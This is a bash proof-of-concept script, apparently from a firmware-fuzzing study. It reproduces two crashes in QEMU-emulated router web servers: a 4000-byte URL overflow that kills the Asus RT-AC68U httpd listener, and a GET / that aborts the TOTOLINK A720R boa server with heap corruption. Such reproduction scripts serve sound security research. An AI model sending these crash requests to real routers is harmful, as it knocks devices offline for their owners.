#!/bin/bash
# AC68U URL-overflow listener termination (paper #3, B-class) + A720R GET / SIGABRT (#9)
VT=/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/verified_targets
QARM=/home/webfuzz/Documents/qemu-rrfuzz/build/qemu-arm
QMIPS=/home/webfuzz/Documents/qemu-rrfuzz/build/qemu-mips
A720=/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/images/TOTOLINK_A720R

echo '===== RT-AC68U httpd: 4000-byte URL overflow, listener-death check ====='
cd "$VT/Asus_RTAC68U"
pkill -f "RTAC68U/rootfs/usr/sbin/httpd" 2>/dev/null; sleep 1
setsid env LD_PRELOAD=./libnvfuzz_arm.so $QARM -L rootfs rootfs/usr/sbin/httpd -p 8089 >/tmp/ac68u_repro.log 2>&1 &
sleep 5
python3 - <<'PY'
import socket, time
def probe():
    try:
        s=socket.create_connection(("127.0.0.1",8089),timeout=2); s.close(); return "ALIVE"
    except Exception as e: return f"DEAD({type(e).__name__})"
print(f"baseline: {probe()}")
try:
    s=socket.create_connection(("127.0.0.1",8089),timeout=5)
    s.sendall(b"GET /"+b"A"*4000+b" HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
    s.settimeout(3)
    try: r=s.recv(32)
    except Exception as e: r=f"<{type(e).__name__}>"
    s.close()
except Exception as e: r=f"send:{type(e).__name__}"
time.sleep(2)
print(f"GET /AAAA(4000) -> recv={r!r} ; listener={probe()}")
PY
echo "--- QEMU stderr: ---"; grep -m1 "uncaught target signal" /tmp/ac68u_repro.log
pkill -f "RTAC68U/rootfs/usr/sbin/httpd" 2>/dev/null

echo
echo '===== TOTOLINK A720R boa: GET / -> SIGABRT heap corruption, listener death ====='
cd "$A720"
pkill -f "TOTOLINK_A720R/bin/boa" 2>/dev/null; sleep 1
setsid $QMIPS -L . bin/boa -c . -d >/tmp/a720r_repro.log 2>&1 &
sleep 5
python3 - <<'PY'
import socket, time
def probe():
    try:
        s=socket.create_connection(("127.0.0.1",8080),timeout=2); s.close(); return "ALIVE"
    except Exception as e: return f"DEAD({type(e).__name__})"
print(f"baseline: {probe()}")
try:
    s=socket.create_connection(("127.0.0.1",8080),timeout=5)
    s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
    s.settimeout(3)
    try: r=s.recv(32)
    except Exception as e: r=f"<{type(e).__name__}>"
    s.close()
except Exception as e: r=f"send:{type(e).__name__}"
time.sleep(2)
print(f"GET / -> recv={r!r} ; listener={probe()}")
PY
echo "--- QEMU stderr: ---"; grep -m1 "uncaught target signal" /tmp/a720r_repro.log
pkill -f "TOTOLINK_A720R/bin/boa" 2>/dev/null
